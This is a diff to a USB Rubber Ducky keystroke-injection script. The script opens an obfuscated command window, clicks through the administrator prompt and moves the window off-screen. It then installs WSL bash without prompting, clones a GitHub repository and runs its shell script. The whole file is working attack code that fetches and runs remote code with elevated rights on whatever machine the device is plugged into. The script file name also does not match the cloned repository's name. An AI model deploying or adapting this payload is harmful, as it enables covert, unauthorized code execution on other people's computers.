@@ -33,10 +33,10 @@ REM Hit the 'Windows' key and 'r' for run
 GUI r
 REM Wait for a few CPU cycles
 DELAY 50
-REM Start of obvuscation...
+REM Start of obfuscation...
 REM Based off instructions found at: https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---generic-batch
 STRING cmd /Q /D /T:7F /F:OFF /V:ON /K
-REM Start of escelated permissions work around
+REM Start of escalated permissions work around
 REM  Instructions from: www.howtogeek.com/howto/windows-vista/run-a-command-as-administrator-from-the-widows-vista-run-box
 CONTROL SHIFT ENTER
 DELAY 500
@@ -44,7 +44,7 @@ REM Get rid of authentication pop-up
 ALT c
 DELAY 500
 ENTER
-REM End of escelated permissions work around
+REM End of escalated permissions work around
 REM Remember that we are Admin now.
 DELAY 750
 ALT SPACE
@@ -52,12 +52,20 @@ STRING M
 DOWNARROW
 REPEAT 100
 ENTER
-REM End of obvuscation...
+REM End of obfuscation...
+REM Change current working directory within current shell to temp
+STRING CD %TEMP%
+ENTER
+REM Start of payload...
 REM Write a string into the 'Run' menu command to install Bash without prompt
 REM Based off instructions found at: http://www.howtogeek.com/249966/how-to-install-and-use-the-linux-bash-shell-on-windows-10/
-STRING cmd lxrun /install /y
-REM Commit to starting local shell
+REM And instructions from: http://www.howtogeek.com/261591/how-to-create-and-run-bash-shell-scripts-on-windows-10/
+STRING cmd lxrun /install /y && bash -c "apt-get update && apt-get install gnupg git && git clone https://github.com/S0AndS0/Perinoid_Pipes && cd Perinoid_Pipes && chmod +x Parinoid_Pipes.sh && ./Parinoid_Pipes.sh --help > help.log"
+REM Note everything between above quotes, after the '&&' will be run in the
+REM Bash shell once it has been installed, at the very end where the script
+REM outputs its help to a file will show if this succeeded.
 ENTER
 REM Wait for a few CPU cycles
 DELAY 100
+REM End of payload...
 REM End of script...
